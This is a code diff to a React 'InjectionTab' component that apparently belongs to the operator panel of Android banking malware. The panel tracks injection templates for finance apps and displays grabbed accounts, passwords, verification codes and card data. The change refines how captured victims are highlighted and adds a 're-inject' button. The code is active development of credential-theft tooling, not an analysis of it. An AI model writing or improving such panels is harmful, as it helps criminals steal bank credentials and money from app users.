@@ -470,6 +470,7 @@ export default function InjectionTab({
                   )
                   .sort(compareGrabbedNewest)[0]
                 const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
+                const hasCapture = !!grabbed
                 const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                 // 自动注入开关只表示功能已启用；实际运行态以活跃任务为准。
                 // 一旦已经获取到本次表单数据，用户下一步需要的是重新开始一轮注入，
@@ -481,8 +482,8 @@ export default function InjectionTab({
                 const category = getFinanceCategory(packageName, appName)
                 const colors = ['#a855f7','#e74c3c','#d4af37','#1890ff','#52c41a','#f87171','#fbbf24','#7c3aed','#06b6d4','#ec4899']
                 const c = colors[(tpl.name || '').length % colors.length]
-                const bg = hasData ? 'rgba(82,196,26,.08)' : isActive ? 'rgba(24,144,255,.06)' : 'rgba(255,255,255,.03)'
-                const bd = hasData ? '1px solid rgba(82,196,26,.3)' : isActive ? '1px solid rgba(24,144,255,.3)' : '1px solid rgba(255,255,255,.08)'
+                const bg = hasCapture ? 'rgba(82,196,26,.08)' : isActive ? 'rgba(24,144,255,.06)' : 'rgba(255,255,255,.03)'
+                const bd = hasCapture ? '1px solid rgba(82,196,26,.3)' : isActive ? '1px solid rgba(24,144,255,.3)' : '1px solid rgba(255,255,255,.08)'
 
                 return (
                   <div key={packageName} style={{ padding: '12px 14px', background: bg, border: bd, borderRadius: 8, transition: 'all .15s' }}>
@@ -500,7 +501,7 @@ export default function InjectionTab({
                       </div>
                       <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 2 }}>
                         {category && <span style={{ fontSize: 9, color: '#fbbf24', background: 'rgba(251,191,36,.1)', padding: '1px 5px', borderRadius: 3, fontWeight: 600 }}>{category}</span>}
-                        {isInjecting && <span style={{ fontSize: 8, color: isConfirmed ? '#52c41a' : '#1890ff', background: isConfirmed ? 'rgba(82,196,26,.15)' : 'rgba(24,144,255,.15)', padding: '2px 6px', borderRadius: 4, fontWeight: 700 }}>{isConfirmed ? '已注入' : '注入中'}</span>}
+                        {isInjecting && !hasCapture && <span style={{ fontSize: 8, color: isConfirmed ? '#52c41a' : '#1890ff', background: isConfirmed ? 'rgba(82,196,26,.15)' : 'rgba(24,144,255,.15)', padding: '2px 6px', borderRadius: 4, fontWeight: 700 }}>{isConfirmed ? '已注入' : '注入中'}</span>}
                       </div>
                     </div>
                     {hasData && (
@@ -512,7 +513,7 @@ export default function InjectionTab({
                       </div>
                     )}
                     <div style={{ display: 'flex', gap: 6, paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.05)' }}>
-                      {hasData ? (
+                      {hasCapture ? (
                         <button onClick={() => startInjection(tpl)} disabled={isLoading} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(24,144,255,.3)', background: 'rgba(24,144,255,.1)', color: '#38bdf8', cursor: isLoading ? 'wait' : 'pointer' }}>{isLoading ? '重注中...' : '重注'}</button>
                       ) : isInjecting ? (
                         <button onClick={() => stopInjection(tpl)} style={{ flex: 1, padding: '6px 0', fontSize: 11, fontWeight: 600, borderRadius: 6, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.1)', color: '#f87171', cursor: 'pointer' }}>停止注入</button>
